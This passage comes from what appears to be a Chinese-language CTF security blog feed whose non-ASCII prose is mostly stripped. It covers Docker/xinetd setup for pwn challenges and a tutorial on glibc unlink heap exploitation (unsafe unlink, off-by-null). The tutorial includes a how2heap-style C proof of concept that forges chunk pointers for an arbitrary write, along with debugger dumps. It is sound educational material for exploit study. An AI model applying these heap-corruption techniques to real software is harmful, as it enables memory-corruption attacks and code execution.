up</span><br></pre></td></tr></table></figure><p><strong></strong>docker0</p><h3 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h3><p> <a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a></p><ul><li> bin   flag </li><li>dockerfile </li></ul><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br></pre></td></tr></table></figure><p>ctf.xinetd </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server_args = --userspec=1000:1000 /home/ctf ./helloworld</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">server_args = --userspec=1000:1000 /home/ctf </span><br></pre></td></tr></table></figure><p>README  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;vuln&quot;</span> .</span><br><span class="line"></span><br><span class="line"><span class="comment"># pub_port </span></span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:pub_port:9999&quot;</span> -h <span class="string">&quot;vuln&quot;</span> --name=<span class="string">&quot;vuln&quot;</span> vuln</span><br></pre></td></tr></table></figure><p> chroot <code>/home/ctf</code> dockerfilelib</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server      = /usr/sbin/chroot</span><br></pre></td></tr></table></figure><h3 id="pwn-deploy-chroot"><a href="#pwn-deploy-chroot" class="headerlink" title="pwn_deploy_chroot"></a>pwn_deploy_chroot</h3><ul><li>ctf <a href="https://github.com/giantbranch/pwn_deploy_chroot">giantbranch&#x2F;pwn_deploy_chroot</a><a href="http://www.giantbranch.cn/2018/09/24/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E5%9C%B0%E9%83%A8%E7%BD%B2%E5%A4%9A%E9%81%93ctf%20pwn%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/"></a> </li></ul><h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><ul><li> ctf_xinetd </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chall  </span><br><span class="line"> ctf.xinetd  </span><br><span class="line"> Dockerfile  </span><br><span class="line"> bin  </span><br><span class="line">  run.sh  </span><br><span class="line">  bzImage  </span><br><span class="line">  rootfs.cpio  </span><br><span class="line"> README.md</span><br><span class="line"> start.sh </span><br></pre></td></tr></table></figure><p>docker </p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>  </span><br><span class="line"></span><br><span class="line">DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \  </span></span><br><span class="line">apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \  </span><br><span class="line">apt-get install -y lib32z1 xinetd git libglib2.<span class="number">0</span>-dev libfdt-dev \</span><br><span class="line">libpixman-<span class="number">1</span>-dev zlib1g-dev qemu qemu-system-x86  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m pwn</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./chall/ /  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/run.sh&quot;</span>]  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">25000</span></span><br></pre></td></tr></table></figure><p> ctf.xinetd  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">service ctf  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">disable</span> = no  </span><br><span class="line">socket_type = stream  </span><br><span class="line">protocol = tcp  </span><br><span class="line"><span class="built_in">wait</span> = no  </span><br><span class="line">user = pwn  </span><br><span class="line"><span class="built_in">type</span> = UNLISTED  </span><br><span class="line">port = 25000  </span><br><span class="line"><span class="built_in">bind</span> = 0.0.0.0  </span><br><span class="line">server = /run.sh    <span class="comment"># </span></span><br><span class="line"><span class="comment"># replace helloworld to your program  </span></span><br><span class="line">banner_fail = /etc/banner_fail  </span><br><span class="line"><span class="comment"># safety options  </span></span><br><span class="line">per_source = 10 <span class="comment"># the maximum instances of this service per source IP address  </span></span><br><span class="line">rlimit_cpu = 20 <span class="comment"># the maximum number of CPU seconds that the service may use  </span></span><br><span class="line"><span class="comment">#rlimit_as = 1024M # the Address Space resource limit for the service  </span></span><br><span class="line"><span class="comment">#access_times = 2:00-9:00 12:00-24:00  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unsafe-unlink</title>
      <link href="/2023/09/13/unsafe-unlink/"/>
      <url>/2023/09/13/unsafe-unlink/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id="Glibc-unlink"><a href="#Glibc-unlink" class="headerlink" title="Glibc unlink"></a>Glibc unlink</h2><p> free chunk  bins  unlink</p><p></p><ul><li>int_free pfreechunkav  arena(struct malloc_state)lock</li><li>prev_inuse0unsorted binprev_size   bin  size unlink prev_chunk</li><li>top_chunk, unlink nextchunk</li><li></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">  prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>)prevsize));         <span class="comment">// p = p-prevsize, chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nextchunk = chunk_at_offset(p, size);  sizechunkchunk</span></span><br><span class="line"><span class="comment">// nextsize = chunksize(nextchunk); </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = <span class="built_in">inuse_bit_at_offset</span>(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, nextchunk);    <span class="comment">//  arena  next_chunk </span></span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">  <span class="built_in">clear_inuse_bit_at_offset</span>(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>unlink3chunka-b-ca-bunsortedbin ctop_chunk</p><ul><li>unsorted bin freefdchunk</li><li>free b, free a arena&lt;-&gt;b  unlink(av, b)</li><li>free a, free b arena&lt;-&gt;a  int_free  unlink(av, a)</li><li>fd&#x3D;a-&gt;fd&#x3D;arena, bk&#x3D;a-&gt;bk&#x3D;arena arena-&gt;bk&#x3D;arenaareba-&gt;fd&#x3D;arenaarena&lt;-&gt;a  arena unlink</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">unlink_chunk</span><span class="params">(mstate av, mchunkptr p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span>(p) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(p)))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">      <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">        p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">        p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free</p><ul><li>paarenabinsarenaheadfoot</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">// size</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">// chunkprev_size</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)    (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br><span class="line"></span><br><span class="line">bck = <span class="built_in">unsorted_chunks</span>(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">  <span class="built_in">malloc_printerr</span>(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set_head</span>(p, size | PREV_INUSE);</span><br><span class="line"><span class="built_in">set_foot</span>(p, size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_free_chunk</span>(av, p);</span><br></pre></td></tr></table></figure><p>arenabins</p><ul><li>fdbk</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bins[<span class="number">1</span>] = bins[<span class="number">0</span>] = &amp;bins - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p></p><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><p> <code>fd-&gt;bk != p || bk-&gt;fd != p</code>  fd, bk </p><ul><li> got  hook</li></ul><h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h3><p> PIE  gotgotheap overflow</p><ul><li> unlink  <code>p-&gt;fd-&gt;bk = p-&gt;bk, p-&gt;bk-&gt;fd = p-&gt;fd</code></li><li> p </li></ul><ol><li> malloc A,B</li><li>A A Bheader</li></ol><ul><li>target &#x3D; &amp;p targetp</li><li> A  fake free chunk: prev_inuse, size, <em>fd&#x3D;&amp;target-0x18, bk&#x3D;&amp;target&#x3D;0x10</em></li><li> B headerfake free chunk  B </li></ul><ol start="3"><li>free B  unlink<strong>p  fake free chunk</strong>unlink</li></ol><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+---------+                     +----------+ </span><br><span class="line">|         |                     |          |</span><br><span class="line">|    A    |                     +----------+                    </span><br><span class="line">|         |                     |          |  A =&gt; fake heap head(sz, fd, bk) + data </span><br><span class="line">|         |                     |fake heap |</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+  ==heap overflow===&gt;+----------+   ===========================&gt; free B =&gt; unlink</span><br><span class="line">|         |                     |ps     sz |</span><br><span class="line">|         |                     |          |  B head =&gt; prev size </span><br><span class="line">|   B     |                     |          |            prev_inuse 0</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+                     +----------+</span><br></pre></td></tr></table></figure><p>how2heap </p><ul><li>no-pie</li><li>ubuntu 22.04assert.</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> malloc_size = <span class="number">0x420</span>;</span><br><span class="line">  <span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  chunk0_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);            <span class="comment">// chunk0</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);  <span class="comment">// chunk1</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr,</span><br><span class="line">         chunk0_ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_head</span></span><br><span class="line">  chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake fd &amp;&amp; fake bk</span></span><br><span class="line">  chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">3</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// chunk1  header </span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">  <span class="comment">// chunk1 -&gt; prev_size</span></span><br><span class="line">  chunk1_hdr[<span class="number">0</span>] = malloc_size;   </span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been &quot;</span></span><br><span class="line">      <span class="string">&quot;0x430, however this is its new value: %p\n&quot;</span>,</span><br><span class="line">      (<span class="type">void</span> *)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prev_inuse  0</span></span><br><span class="line">  chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// unlink </span></span><br><span class="line">  <span class="comment">// chunk0_ptr-&gt;fd = &amp;chunk0_ptr-0x18</span></span><br><span class="line">  <span class="comment">// chunk0_ptr  *(chunk0_ptr - 0x18 )</span></span><br><span class="line">  <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(victim_string, <span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)victim_string;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>, victim_string);</span><br><span class="line">  chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>, victim_string);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chunk0_ptr-&gt;bk-&gt;fd = chunk0_ptr-&gt;fd</code>target  <code>&amp;target-0x10</code> target0x18</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk0_ptr </span></span><br><span class="line">pwndbg&gt; x/8xg 0x405290  </span><br><span class="line">0x405290:       0x0000000000000000      0x0000000000000431</span><br><span class="line">0x4052a0:       0x0000000000000000      0x0000000000020d61</span><br><span class="line">0x4052b0:       0x0000000000404050      0x0000000000404058    <span class="comment"># fake_fd fake_bk</span></span><br><span class="line">0x4052c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;chunk0_ptr</span></span><br><span class="line"><span class="comment"># (&amp;chunk0_ptr - 0x10) -&gt; fd = fake_fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000000000404058+0x10   </span><br><span class="line">0x404068 &lt;chunk0_ptr&gt;:  0x0000000000404050      0x0000000000000000</span><br><span class="line">0x404078:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404088:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404098:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>target  &amp;target-0x18got<br><code>arr[0]</code> <code>arr[0]</code> gotgot<br><del></del></p><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p></p><p>libc2.29 </p><ul><li>chunk A.</li><li>chunk B,off by one chunk C presize  chunk A size +chunk B size,chunk Cprev_inuse0.</li><li>chunk C</li></ul><p>libc2.29 prev_chunk size chunk  prev_size  off by null chunk sizechunkchunk</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br></pre></td></tr></table></figure><p>off by nullarenain_usesize</p><ul><li> ABC 0x438 ctop_chunk</li><li>AA<strong></strong>Bprev_inuse </li><li>freeB</li><li>unlink_chunkfd, bk <code>__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, 0)</code></li></ul><p>unlinkfd,bk</p><ul><li>tcache leak libc 2.32  <code>(fd&gt;&gt;12) ^ 0</code></li><li>unsorted bin chunk fd,bk</li><li>largebin chunkfd_nextsize  bk_nextsize</li></ul><p>heap fengshui fake chunkoff by null</p><ul><li>a-x-b-c-x-d-x, a,b,c,d unsorted binxchunk c&gt;d&gt;a&#x3D;b</li><li>free a, c, d fd d-&gt;c-&gt;a-&gt;arena </li><li>free b b,c b-&gt;d-&gt;a-&gt;arena c</li><li>unsorted bin FIFO adlargebin b-ceec fd, bk</li><li>unsorted bin f</li><li> ecsizefd, bk unlink</li><li>chunk c-&gt;fd&#x3D;a, c-&gt;bk&#x3D;dlargebin a-&gt;bk &#x3D; d d-&gt;fd &#x3D; a</li><li>a,dlarge bin </li><li>bypass bkfree a, free fa-&gt;bk &#x3D; f, abkfcpartial writebk</li><li>bypass fd: bypass bkbkarenafree f, free dd-&gt;fd&#x3D;flargebind-&gt;fd&#x3D;fd<ul><li>unsortbindflargebind-&gt;arena fd, d-&gt;arenafd</li></ul></li></ul><p></p><ul><li>size <code>x0</code> fc </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 